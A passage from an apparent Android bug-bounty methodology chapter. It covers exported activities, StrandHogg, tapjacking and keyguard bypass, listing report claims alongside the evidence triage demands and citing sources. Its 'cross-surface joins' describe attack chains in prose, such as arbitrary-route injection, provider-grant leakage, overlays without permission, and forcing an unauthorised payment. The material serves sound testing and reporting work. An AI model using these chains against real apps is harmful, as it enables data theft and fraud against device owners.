| "StrandHogg 2.0 is possible because `minSdkVersion` is 21." | Without a reproduction this is a version-support statement, and CVE-2020-0096 is fixed from the May 2020 SPL on 8.0/8.1/9 and absent from 10+. | The reproduction on a device below that patch level, with `ro.build.version.security_patch` in the evidence (D04-034). |
| "An app-level PIN can be bypassed with a deep link." | Google Mobile VRP lists "Secondary lockscreen bypasses" as non-qualifying; the disclosed corpus pays $0–$500 for these. | The same path reaching *another user's* data rather than past the local gate — refile as theft of sensitive data (D04-008 escalation). |
| "`adb shell am start` reached the internal activity." | `adb shell` runs as uid 2000 with privileges no third-party app holds; on some builds it starts non-exported components. | The same start from a PoC APK whose `dumpsys package` block shows an empty requested-permission list (D04-005). |
| "The exported activity displayed `isAdmin=true`." | Client-side rendering of your own extra. The app echoing your input is not authorisation. | The backend request carrying the value and returning `200` with privileged data, with the layer-ordering control run (D04-009, D04-010). |
| "`PreferenceActivity` fragment injection crashes the app." | H1 #43988 paid **$0** for exactly this — a reflection crash is not impact. | Landing on a fragment that discloses credentials or bypasses a gate, screenshotted inside the target app (D04-014). |
| "An overlay is possible over the app." | The attacker cannot know when the confirm button is on screen; triage closes it as theoretical. | The overlay appearing within one frame of the target dialog, three times, with the oracle's timestamped log alongside (D04-049). |
| "The API behind the bypassed screen returned 400 rather than 401." | A body parser or sanitiser in front of the auth middleware produces exactly this. | The same endpoint with a minimal well-formed `{}` body still returning a domain-field error rather than `401` (D04-009). |
| "The app bundles a library with a known-vulnerable exported activity." | A coordinate in a dependency tree is inventory, not impact — and the family in D04-069 carries no CVE at all, so a version string proves nothing on its own. | The class present in the dex, the activity reachable from a zero-permission PoC, and the host app's own file demonstrably overwritten (D04-069). |
| "The widget shows the balance on the home screen." | On a device whose keyguard forbids widgets this needs an already-unlocked phone, which is the owner. | The same render reproduced with the keyguard up, placed beside the black `screencap` of the in-app screen that does set `FLAG_SECURE` (D04-071). |
| "There is no Java code in `MainActivity`, so the entry point is clean." | Flutter, Unity and React Native read the extras in Dart, C# and JS respectively; jadx shows an empty `onCreate` either way. | The managed/Dart symbol that reads the extra, plus a behaviour change on device when it is set (D04-018, D04-070). |

## Cross-surface joins

- **Exported activity × `intentMatchingFlags` × the Flutter/RN router (D04-006 + D04-018 + D09).** Testers review the deep-link surface from the browser's point of view and conclude the `autoVerify`'d hosts bound it. They do not test the **local** path: without `enforceIntentFilter`, an installed app sends an *explicit* `VIEW` intent to the exported `MainActivity` carrying any URI at all — `javascript:`, `data:`, an arbitrary host — and the Dart or JS router accepts it. The deep-link chapter says "hosts are verified"; the manifest chapter says "the activity is exported, so what"; the join is an unauthenticated arbitrary-route primitive.
- **Result channel × ContentProvider grants (D04-023 + D07).** The provider review checks `exported` and `readPermission` on every `<provider>` and correctly concludes the private ones are unreachable. The activity review greps `setResult` for leaked extras. Nobody joins them: `setResult(RESULT_OK, getIntent())` on *any* exported activity transfers the caller's requested grant flags back, so a non-exported provider with `grantUriPermissions="true"` — a combination both reviews individually approve — becomes readable by any installed app.
- **Recents/`FLAG_SECURE` × the app-lock gate (D04-042 + D04-008 + D13).** The `FLAG_SECURE` review runs while logged in and passes. The app-lock review checks that backgrounding re-arms the PIN and passes. The join is the moment between them: the snapshot taken at the instant the lock armed still shows the last authenticated screen, so the control that hides the data from a thief is defeated by the control that was supposed to lock it.
- **Task resurface × tapjacking trigger (D04-030 + D04-049 + D23).** The overlay reviewer cannot demonstrate timing and files "theoretical". The task reviewer shows `FLAG_ACTIVITY_NEW_TASK` resurfaces a mid-flow task and files "Medium, restores state". Joined, the attacker *causes* the confirm dialog to appear rather than waiting for it — which supplies exactly the oracle the overlay finding was missing, and turns two Mediums into a completed unauthorised payment.
- **Bubble metadata × overlay policy (D04-040 + D03 + D04-047).** The permission reviewer confirms the app does not request `SYSTEM_ALERT_WINDOW` and marks the overlay surface closed. The notification reviewer sees `BubbleMetadata` and marks it a UX feature. The join is that a bubble target declared `allowEmbedded="true"` with `setAutoExpandBubble(true)` and `setSuppressNotification(true)` floats over other apps **without any overlay permission** and is exempt from the reasoning that closed the surface.
- **Exported activity × shadow API version (D04-064 + D15).** The mobile reviewer extracts the endpoint from the activity and tests it with the app's own session. The API reviewer tests the *current* version the web app calls. Neither notices that the activity calls `/api/v1/` while the web app moved to `/api/v3/`, and that v1 never received the object-level authorisation fix — so the IDOR that is closed on the surface everyone tests is open on the one only the app reaches.
- **`showWhenLocked` × the deep-link router (D04-056 + D04-058 + D25).** The keyguard review finds one benign `showWhenLocked` activity and passes. The router review maps every route and tests them unlocked. The join: the pre-unlock activity contains a link that enters the router, and the router does not know it is running over the keyguard — so a locked device drives arbitrary in-app routes.
- **Library-contributed exported activity × the SCA report (D04-069 + D02 + D17).** The dependency reviewer runs `osv-scanner`, sees no advisory, and marks the third-party surface clean. The component reviewer enumerates the manifest by the app's own package prefix and never looks at `com.canhub.cropper.CropImageActivity` sitting in it. The join is an exported arbitrary-file-write into the host app's credential store, contributed by a library that is archived, carries no CVE, and therefore no scanner will ever flag — the class-level grep is the only thing that finds it.
- **Lock-screen tile × the app-lock gate (D04-068 + D04-008 + D13).** The keyguard reviewer tests activities and finds them all gated. The app-lock reviewer confirms the PIN re-arms on background. Neither tests the Quick Settings tile, which Google documents as displaying *on top of* the lock screen and which calls `startActivityAndCollapse` into the same screens both reviews just closed — bypassing the keyguard and the app lock in one tap.
- **`activity-alias` × the permission review (D04-003 + D03).** The permission reviewer enumerates `<activity>` elements, confirms the sensitive ones are `exported="false"` with a `signature` permission, and writes a clean negative. The alias, which carries its own `exported` and whose `permission` *supplants* the target's, is in a different element the enumeration never visited. The join re-opens every activity the permission review closed.

## Sources

- **Android platform documentation** — `guide/topics/manifest/activity-element` and `activity-alias-element` (`documentLaunchMode`, `excludeFromRecents`, `autoRemoveFromRecents`, `noHistory`, `allowEmbedded`, `knownActivityEmbeddingCerts`, `requireContentUriPermissionFromCaller`, `showForAllUsers`, `directBootAware`, launchMode table); `guide/components/activities/tasks-and-back-stack`; `guide/components/activities/background-starts` (BAL rules, `allowCrossUidActivitySwitchFromBelow`); `about/versions/12/behavior-changes-12` (explicit `exported`, notification trampolines, `NOTIFICATION_TRAMPOLINE_BLOCK`, untrusted-touch blocking); `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` and `/15/features` (`ComponentCaller`, `checkContentUriPermissionFull()`, edge-to-edge); `about/versions/16/behavior-changes-16` (`intentMatchingFlags`, predictive back, orientation/aspect-ratio, Safer Intents); `guide/navigation/custom-back/predictive-back-gesture`; `develop/ui/views/notifications/bubbles`; `develop/ui/views/quicksettings-tiles`.
- **Google security-risk articles** — `risks/android-exported`, `risks/access-control-to-exported-components`, `risks/intent-redirection`, `risks/strandhogg`, `risks/tapjacking`.
- **Google VRP doctrine** — Mobile VRP non-qualifying list ("Variants of Strandhogg and Tapjacking", "Secondary lockscreen bypasses"); Invalid Reports "Intended Behavior" and the three tapjacking carve-outs; Android & Google Devices in-scope impacts and the lockscreen-bypass tier.
- **OWASP MASTG / MASVS** — MASTG-TEST-0364, -0340, -0289, -0291, -0292, -0293, -0294, -0029; MASTG-TECH-0160, -0164, -0172, -0002; MASTG-KNOW-0017, -0022, -0132; MASTG-TOOL-0004, -0015; MASTG-BEST-0040; MASWE-0018, -0023, -0036, -0038, -0039, -0040; MASVS-PLATFORM-1/-3, MASVS-AUTH-1. Verified against `data/mastg-android-tests.csv` and `data/mastg-android-techniques.csv`.
- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) — the P5 pinning of `mobile_security_misconfiguration.tapjacking`, `insecure_data_storage.screen_caching_enabled` and `application_level_denial_of_service_dos.app_crash.malformed_android_intents`, and the P1/P2/P3 paths this chapter converts into.
- **MITRE ATT&CK Mobile** (`data/mitre-attack-mobile-android.csv`) — T1417/T1417.002, T1453, T1516, T1624.001, T1626/T1626.001, T1628/T1628.001, T1629.001, T1655.001.
- **AOSP security-model paper** — threat classes [T.A2], [T.A4], [T.A5], [T.A6], [T.A7]; Table 3 (Android 12–13 passthrough-touch restrictions; `SYSTEM_ALERT_WINDOW` moved to special permissions in 6.x). AOSP severity guidance for persistent vs temporary local DoS and lockscreen bypass.
- **Disclosed HackerOne reports** — #499348 (Twitter Lite, Critical), #283058, #2555949, #532836, #694053, #414101, #1737358, #189793, #43988, #3764217, #3829030, #637194, #1825679, #1784645, #50884, #377107, #161710, #288955, #258460, #1454002, #1408692, #55064, #145402, #951691, #65729, #1061211, #1325649.
- **Research and write-ups** — TapTrap (USENIX Security 2025, TU Wien, taptrap.click); Oversecured "Gaining access to arbitrary Content Providers" and "Discovering vendor-specific vulnerabilities in Android"; Promon StrandHogg / CVE-2020-0096; the bugscale Samsung S25 `IapReceiver` restart-oracle chain; Yousef Elsheikh `CheckoutActivity`; m_kamal `LoginSelectorActivity`/`orig_uri`; ghandar0x `AuthAnswerActivity`; Raju Kumar `SaveToMediumActivity`; Niraj Kharel's parameter brute-force list; sec-88 "Task Hijacking" and "Exported Activity Hacking"; HackTricks `android-task-hijacking.md`, `tapjacking.md`, `accessibility-services-abuse.md`, `android-checklist.md`; Mobile Hacking Lab "Android Intent Security: Exploiting Exported Components and Deep Links"; YesWeHack Android recon guide; EDB 49563.
- **Tooling** — drozer `app.activity.info` / `app.activity.start` / `app.activity.forintent` / `app.package.launchintent` and the Intent grammar and flag map verified in `src/drozer/android.py`; objection `android intent launch_activity`, `android hooking get current_activity`, `android ui screenshot` and its FLAG_SECURE control; MobSF rules `task_hijacking`, `task_hijacking2`, `task_affinity_set`, `android_tapjacking`, `exported_intent_filter_exists`, `explicitly_exported`; mobsfscan `android_detect_tapjacking`; mindedsecurity `MSTG-PLATFORM-2_5`, `-2_6`, `-4_3`, `-9_1`, `-9_2`; QARK `task_affinity.py`, `task_reparenting.py`; Carlos Polop's `Tapjacking-ExportedActivity`; az0mb13 `Task_Hijacking_Strandhogg`.
- **SDK supply chain** — Oversecured's SDK-security write-up on the `android-image-cropper` family (`customOutputUri` → `BitmapUtils.writeBitmapToUri` → host-app credential-store overwrite) and the axeploit/dev.to root-cause analyses; the three coordinates `com.theartofdev.edmodo`, `com.github.arthurhub`, `com.vanniktech`; CanHub CHANGELOG 4.7.0 (2025-11-27) URI-validation fix — no CVE assigned. Il2CppDumper (`dump.cs`) for recovering Unity managed symbols.
- **claude-bughunter corpus (4,467-star bug-hunting repository)** — the layer-ordering trap, marker discipline, the body-diff rule, the statistical-sample rule, the shell-loop ban, shadow-API behavioural diffing, the five-screenshot evidence pattern and HAR sanitising, the pre-severity gate and retraction discipline, and chain-filing order. These supply D04-005, -009, -060, -064, -065, -066 and -067 and govern every severity claim in the chapter.
